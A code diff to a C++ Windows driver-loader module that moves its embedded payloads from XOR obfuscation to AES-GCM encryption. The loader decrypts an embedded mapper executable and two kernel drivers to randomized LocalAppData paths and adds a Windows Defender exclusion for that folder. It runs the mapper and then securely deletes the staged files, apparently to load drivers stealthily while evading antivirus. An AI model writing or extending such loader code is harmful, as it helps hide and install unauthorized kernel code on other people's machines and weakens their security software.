@@ -8,12 +8,14 @@
 #endif
 #include <windows.h>
 #include <bcrypt.h>
+#include <ntstatus.h>
 #include <shlobj.h>
 #include <objbase.h>
 #include <wincrypt.h>
 #include <cstdio>
 #include <cstring>
 #include <string>
+#include <vector>
 #include <filesystem>
 
 #pragma comment(lib, "bcrypt.lib")
@@ -21,45 +23,48 @@
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "crypt32.lib")
 
+#ifndef STATUS_AUTH_TAG_MISMATCH
+#define STATUS_AUTH_TAG_MISMATCH ((NTSTATUS)0xC000A002L)
+#endif
+
 namespace
 {
-    static constexpr unsigned char WHOSWHO_KEY[] = {
-        0xA3, 0x5F, 0x17, 0xD2, 0x8B, 0x64, 0xE9, 0x31,
-        0xCC, 0x4A, 0x76, 0xF0, 0x0E, 0x93, 0xB8, 0x2D
-    };
-
-    static constexpr unsigned char SENTINEL_KEY[] = {
-        0xD7, 0x2B, 0x83, 0x4E, 0xF1, 0x69, 0xA5, 0x1C,
-        0x38, 0xE0, 0x54, 0x9F, 0x7A, 0xC6, 0x0D, 0xB2
-    };
-
-    static constexpr unsigned char MAPPER_KEY[] = {
-        0x91, 0x3C, 0xAE, 0x57, 0xF8, 0x22, 0xD4, 0x6B,
-        0x15, 0xC9, 0x83, 0x4F, 0xBA, 0x60, 0x7E, 0xE3
-    };
-
     bool g_loaded = false;
+    std::string s_last_error;
 
+    void set_last_error(const char* msg)
+    {
+        s_last_error.assign(msg ? msg : "");
+    }
+
+    void set_last_error(const std::string& msg)
+    {
+        s_last_error = msg;
+    }
+
+    void set_last_error_status(const char* prefix, NTSTATUS status)
+    {
+        char buf[64] = {};
+        std::snprintf(buf, sizeof(buf), " (NTSTATUS=0x%08lX)",
+                      static_cast<unsigned long>(status));
+        std::string out = prefix ? prefix : "";
+        out += buf;
+        s_last_error = out;
+    }
 
     bool verify_blob_integrity(const unsigned char* data, unsigned long size,
                                unsigned long expected_size)
     {
         if (size != expected_size)
             return false;
-        if (size < 2 || data[0] != 'M' || data[1] != 'Z')
-            return false;
-
-
-        if (size < 64)
+        if (size < 64 || data[0] != 'M' || data[1] != 'Z')
             return false;
         uint32_t e_lfanew = *reinterpret_cast<const uint32_t*>(data + 0x3C);
         if (e_lfanew >= size - 4)
             return false;
-
         if (data[e_lfanew] != 'P' || data[e_lfanew + 1] != 'E' ||
             data[e_lfanew + 2] != 0 || data[e_lfanew + 3] != 0)
             return false;
-
         return true;
     }
 
@@ -179,83 +184,151 @@ namespace
         CloseHandle(pi.hThread);
     }
 
-    bool decrypt_and_write(const unsigned char* enc, unsigned long enc_size,
-                           const unsigned char* key, size_t key_len,
+    bool aes_gcm_decrypt(const unsigned char* ciphertext, unsigned long ciphertext_len,
+                         const unsigned char* key, unsigned long key_len,
+                         const unsigned char* nonce, unsigned long nonce_len,
+                         const unsigned char* tag, unsigned long tag_len,
+                         unsigned char* plaintext, unsigned long plaintext_len)
+    {
+        if (!ciphertext || !key || !nonce || !tag || !plaintext)
+            return false;
+        if (key_len != 32 || nonce_len != 12 || tag_len != 16)
+            return false;
+        if (ciphertext_len != plaintext_len)
+            return false;
+
+        BCRYPT_ALG_HANDLE alg = nullptr;
+        NTSTATUS status = BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, nullptr, 0);
+        if (!BCRYPT_SUCCESS(status)) {
+            set_last_error_status("BCryptOpenAlgorithmProvider failed", status);
+            return false;
+        }
+
+        status = BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
+                                   reinterpret_cast<PUCHAR>(const_cast<wchar_t*>(BCRYPT_CHAIN_MODE_GCM)),
+                                   sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+        if (!BCRYPT_SUCCESS(status)) {
+            BCryptCloseAlgorithmProvider(alg, 0);
+            set_last_error_status("BCryptSetProperty(GCM) failed", status);
+            return false;
+        }
+
+        DWORD object_length = 0;
+        DWORD got = 0;
+        status = BCryptGetProperty(alg, BCRYPT_OBJECT_LENGTH,
+                                   reinterpret_cast<PUCHAR>(&object_length),
+                                   sizeof(object_length), &got, 0);
+        if (!BCRYPT_SUCCESS(status) || got != sizeof(object_length) || object_length == 0) {
+            BCryptCloseAlgorithmProvider(alg, 0);
+            set_last_error_status("BCryptGetProperty(OBJECT_LENGTH) failed", status);
+            return false;
+        }
+
+        std::vector<unsigned char> key_object(object_length, 0);
+        BCRYPT_KEY_HANDLE hkey = nullptr;
+        status = BCryptGenerateSymmetricKey(alg, &hkey,
+                                            key_object.data(), object_length,
+                                            const_cast<PUCHAR>(key), key_len, 0);
+        if (!BCRYPT_SUCCESS(status)) {
+            BCryptCloseAlgorithmProvider(alg, 0);
+            set_last_error_status("BCryptGenerateSymmetricKey failed", status);
+            return false;
+        }
+
+        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info = {};
+        BCRYPT_INIT_AUTH_MODE_INFO(info);
+        info.pbNonce = const_cast<PUCHAR>(nonce);
+        info.cbNonce = nonce_len;
+        info.pbAuthData = nullptr;
+        info.cbAuthData = 0;
+        info.pbTag = const_cast<PUCHAR>(tag);
+        info.cbTag = tag_len;
+        info.pbMacContext = nullptr;
+        info.cbMacContext = 0;
+        info.cbAAD = 0;
+        info.cbData = 0;
+        info.dwFlags = 0;
+
+        ULONG out_len = 0;
+        status = BCryptDecrypt(hkey,
+                               const_cast<PUCHAR>(ciphertext), ciphertext_len,
+                               &info,
+                               nullptr, 0,
+                               plaintext, plaintext_len,
+                               &out_len, 0);
+
+        BCryptDestroyKey(hkey);
+        SecureZeroMemory(key_object.data(), key_object.size());
+        BCryptCloseAlgorithmProvider(alg, 0);
+
+        if (status == STATUS_AUTH_TAG_MISMATCH) {
+            SecureZeroMemory(plaintext, plaintext_len);
+            set_last_error("AES-GCM tag mismatch (driver blob tampered)");
+            return false;
+        }
+        if (!BCRYPT_SUCCESS(status)) {
+            SecureZeroMemory(plaintext, plaintext_len);
+            set_last_error_status("BCryptDecrypt failed", status);
+            return false;
+        }
+        if (out_len != plaintext_len) {
+            SecureZeroMemory(plaintext, plaintext_len);
+            set_last_error("AES-GCM decrypt produced unexpected length");
+            return false;
+        }
+        return true;
+    }
+
+    bool decrypt_and_write(const unsigned char* ciphertext, unsigned long ciphertext_len,
+                           const unsigned char* key, unsigned long key_len,
+                           const unsigned char* nonce, unsigned long nonce_len,
+                           const unsigned char* tag, unsigned long tag_len,
                            const std::wstring& out_path)
     {
         auto* buf = static_cast<unsigned char*>(
-            VirtualAlloc(nullptr, enc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-        if (!buf)
+            VirtualAlloc(nullptr, ciphertext_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+        if (!buf) {
+            set_last_error("VirtualAlloc failed for driver decrypt buffer");
             return false;
+        }
 
-        for (unsigned long i = 0; i < enc_size; ++i)
-            buf[i] = enc[i] ^ key[i % key_len];
-
-        if (!verify_blob_integrity(buf, enc_size, enc_size)) {
-            SecureZeroMemory(buf, enc_size);
+        if (!aes_gcm_decrypt(ciphertext, ciphertext_len,
+                             key, key_len,
+                             nonce, nonce_len,
+                             tag, tag_len,
+                             buf, ciphertext_len)) {
+            SecureZeroMemory(buf, ciphertext_len);
             VirtualFree(buf, 0, MEM_RELEASE);
+            return false;
+        }
+
+        if (!verify_blob_integrity(buf, ciphertext_len, ciphertext_len)) {
+            SecureZeroMemory(buf, ciphertext_len);
+            VirtualFree(buf, 0, MEM_RELEASE);
+            set_last_error("Decrypted driver blob failed PE integrity check");
             return false;
         }
 
         HANDLE hf = CreateFileW(out_path.c_str(), GENERIC_WRITE, 0, nullptr,
-                                CREATE_ALWAYS,
-                                FILE_ATTRIBUTE_NORMAL, nullptr);
+                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
         if (hf == INVALID_HANDLE_VALUE) {
-            SecureZeroMemory(buf, enc_size);
+            SecureZeroMemory(buf, ciphertext_len);
             VirtualFree(buf, 0, MEM_RELEASE);
+            set_last_error("CreateFileW failed for staged driver");
             return false;
         }
 
         DWORD written = 0;
-        BOOL ok = WriteFile(hf, buf, enc_size, &written, nullptr);
+        BOOL ok = WriteFile(hf, buf, ciphertext_len, &written, nullptr);
         FlushFileBuffers(hf);
         CloseHandle(hf);
-        SecureZeroMemory(buf, enc_size);
+        SecureZeroMemory(buf, ciphertext_len);
         VirtualFree(buf, 0, MEM_RELEASE);
 
-        return ok && written == enc_size;
-    }
-
-    bool write_embedded_mapper(const std::wstring& path)
-    {
-        if (path.empty())
-            return false;
-
-        auto* buf = static_cast<unsigned char*>(
-            VirtualAlloc(nullptr, g_windmapper_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-        if (!buf)
-            return false;
-
-        for (unsigned long i = 0; i < g_windmapper_size; ++i)
-            buf[i] = g_windmapper_data[i] ^ MAPPER_KEY[i % sizeof(MAPPER_KEY)];
-
-        if (!verify_blob_integrity(buf, g_windmapper_size, g_windmapper_size)) {
-            SecureZeroMemory(buf, g_windmapper_size);
-            VirtualFree(buf, 0, MEM_RELEASE);
+        if (!ok || written != ciphertext_len) {
+            set_last_error("WriteFile failed for staged driver");
             return false;
         }
-
-        HANDLE hf = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
-                                CREATE_ALWAYS,
-                                FILE_ATTRIBUTE_NORMAL, nullptr);
-        if (hf == INVALID_HANDLE_VALUE) {
-            SecureZeroMemory(buf, g_windmapper_size);
-            VirtualFree(buf, 0, MEM_RELEASE);
-            return false;
-        }
-
-        DWORD written = 0;
-        BOOL ok = WriteFile(hf, buf, g_windmapper_size, &written, nullptr);
-        FlushFileBuffers(hf);
-        CloseHandle(hf);
-        SecureZeroMemory(buf, g_windmapper_size);
-        VirtualFree(buf, 0, MEM_RELEASE);
-
-        if (!ok || written != g_windmapper_size) {
-            DeleteFileW(path.c_str());
-            return false;
-        }
-
         return true;
     }
 
@@ -289,34 +362,56 @@ namespace driver_loader
         return g_loaded;
     }
 
+    const std::string& last_error()
+    {
+        return s_last_error;
+    }
+
     bool initialize_and_load()
     {
         if (g_loaded)
             return true;
 
+        s_last_error.clear();
+
         std::wstring stage = get_stage_dir();
-        if (stage.empty())
+        if (stage.empty()) {
+            set_last_error("Failed to resolve LocalAppData stage directory");
             return false;
+        }
 
         register_defender_exclusion(stage);
 
         std::wstring mapper_path = make_stage_path(stage, L".exe");
         std::wstring whoswho_path = make_stage_path(stage, L".sys");
         std::wstring sentinel_path = make_stage_path(stage, L".sys");
-        if (mapper_path.empty() || whoswho_path.empty() || sentinel_path.empty())
+        if (mapper_path.empty() || whoswho_path.empty() || sentinel_path.empty()) {
+            set_last_error("Failed to allocate randomized stage paths");
             return false;
+        }
 
-        if (!write_embedded_mapper(mapper_path))
+        if (!decrypt_and_write(g_windmapper_ciphertext, g_windmapper_ciphertext_len,
+                               g_windmapper_key, sizeof(g_windmapper_key),
+                               g_windmapper_nonce, sizeof(g_windmapper_nonce),
+                               g_windmapper_tag, sizeof(g_windmapper_tag),
+                               mapper_path)) {
             return false;
+        }
 
-        if (!decrypt_and_write(g_whoswho_encrypted, g_whoswho_encrypted_size,
-                               WHOSWHO_KEY, sizeof(WHOSWHO_KEY), whoswho_path)) {
+        if (!decrypt_and_write(g_whoswho_ciphertext, g_whoswho_ciphertext_len,
+                               g_whoswho_key, sizeof(g_whoswho_key),
+                               g_whoswho_nonce, sizeof(g_whoswho_nonce),
+                               g_whoswho_tag, sizeof(g_whoswho_tag),
+                               whoswho_path)) {
             secure_delete(mapper_path);
             return false;
         }
 
-        if (!decrypt_and_write(g_sentinel_encrypted, g_sentinel_encrypted_size,
-                               SENTINEL_KEY, sizeof(SENTINEL_KEY), sentinel_path)) {
+        if (!decrypt_and_write(g_sentinel_ciphertext, g_sentinel_ciphertext_len,
+                               g_sentinel_key, sizeof(g_sentinel_key),
+                               g_sentinel_nonce, sizeof(g_sentinel_nonce),
+                               g_sentinel_tag, sizeof(g_sentinel_tag),
+                               sentinel_path)) {
             secure_delete(mapper_path);
             secure_delete(whoswho_path);
             return false;
@@ -344,9 +439,9 @@ namespace driver_loader
             secure_delete(mapper_path);
             secure_delete(whoswho_path);
             secure_delete(sentinel_path);
+            set_last_error("CreateProcessW failed for mapper stage");
             return false;
         }
-
 
         HANDLE hJob = CreateJobObjectW(nullptr, nullptr);
         if (hJob) {
@@ -374,8 +469,10 @@ namespace driver_loader
         secure_delete(whoswho_path);
         secure_delete(sentinel_path);
 
-        if (exit_code != 0)
+        if (exit_code != 0) {
+            set_last_error("Mapper stage exited with non-zero status");
             return false;
+        }
 
         g_loaded = true;
         return true;
